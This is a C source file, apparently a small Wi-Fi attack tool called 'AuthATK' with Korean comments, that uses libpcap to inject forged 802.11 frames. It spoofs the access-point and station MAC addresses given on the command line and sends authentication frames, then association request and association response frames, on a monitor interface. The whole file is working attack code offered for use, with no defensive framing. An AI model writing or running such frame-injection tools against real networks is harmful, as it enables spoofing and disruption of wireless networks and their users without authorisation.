#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>

struct Radio
{
    uint8_t version; /* set to 0 */
    uint8_t pad;
    uint16_t len;     /* entire length */
    uint32_t present; /* fields present */
};

struct AuthenticationBd{
    u_short FcF;
    u_short Dur;
    u_char SoMac[6];
    u_char DeMac[6];
    u_char BSSID[6];
    u_short FSnumber;
};

struct AssociationReqBd{
    u_short FcF;
    u_short Dur;
    u_char SoMac[6];
    u_char DeMac[6];
    u_char BSSID[6];
    u_short FSnumber;
};

struct AssociationResBd{
    u_short FcF;
    u_short Dur;
    u_char SoMac[6];
    u_char DeMac[6];
    u_char BSSID[6];
    u_short FSnumber;
};

struct Authentication
{
    struct Radio rad;
    struct AuthenticationBd AuthBd;
};

struct AssociationReq
{
    struct Radio rad;
    struct AssociationReqBd AssReqBd;
};

struct AssociationRes
{
    struct Radio rad;
    struct AssociationResBd AssResBd;
};

void usage()
{
    printf("syntax: AuthATK <interface> <AP mac> <STA mac>\n");
    printf("sample: AuthATK wlan0 11:22:33:44:55:66 ff:ff:ff:ff:ff:ff\n");
}

typedef struct
{
    char *dev_;
} Param;

Param param = {
    .dev_ = NULL};

bool parse(Param *param, int argc, char *argv[])
{
    if (argc != 4)
    {
        usage();
        return false;
    }
    param->dev_ = argv[1];
    return true;
}

void Mac_(const char *arr, u_char mac_addr[6])
{
    int a;
    if (strlen(arr) != 17)
    {
        printf("Maclen error!!\n");
    }
    char cpyarr[18];
    memcpy(cpyarr, arr, 17);
    for (int i = 0; i < 6; i++) //입력Mac값의 콜론 제거
    {
        cpyarr[i * 3 + 2] = '\0';
        sscanf((const char *)&cpyarr[3 * i], "%x", &a);
        mac_addr[i] = (u_char)a;
    }
}

int main(int argc, char *argv[])
{

    if (!parse(&param, argc, argv))
        return -1;

    unsigned char *Interface = argv[1];
    unsigned char *AP_MAC = argv[2];
    unsigned char *STA_MAC = argv[3];

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(Interface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL)
    {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }

    //패킷 초기화 진행
    struct Authentication packet;
    packet.rad.len = 0x0008;
    packet.AuthBd.FcF = 0x00B0; // 0xB000
    packet.AuthBd.Dur = 0x0;
    packet.AuthBd.FSnumber = 0x0;
    Mac_(AP_MAC, packet.AuthBd.BSSID);
    {
        Mac_(AP_MAC, packet.AuthBd.SoMac);
        Mac_(STA_MAC, packet.AuthBd.DeMac);
        if (pcap_sendpacket(pcap, (char *)&packet, sizeof(packet) - 2) != 0)
        {
            fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
            return -1;
        }
    }
    {
        Mac_(AP_MAC, packet.AuthBd.DeMac);
        Mac_(STA_MAC, packet.AuthBd.SoMac);
        if (pcap_sendpacket(pcap, (char *)&packet, sizeof(packet) - 2) != 0)
        {
            fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
            return -1;
        }
    }
    packet.AuthBd.FcF = 0x0000; // 0x0000
    {
        Mac_(AP_MAC, packet.AuthBd.DeMac);
        Mac_(STA_MAC, packet.AuthBd.SoMac);
        if (pcap_sendpacket(pcap, (char *)&packet, sizeof(packet) - 2) != 0)
        {
            fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
            return -1;
        }
    }
    packet.AuthBd.FcF = 0x0010; // 0x0000
    {
        Mac_(AP_MAC, packet.AuthBd.SoMac);
        Mac_(STA_MAC, packet.AuthBd.DeMac);
        if (pcap_sendpacket(pcap, (char *)&packet, sizeof(packet) - 2) != 0)
        {
            fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
            return -1;
        }
    }
    pcap_close(pcap);
}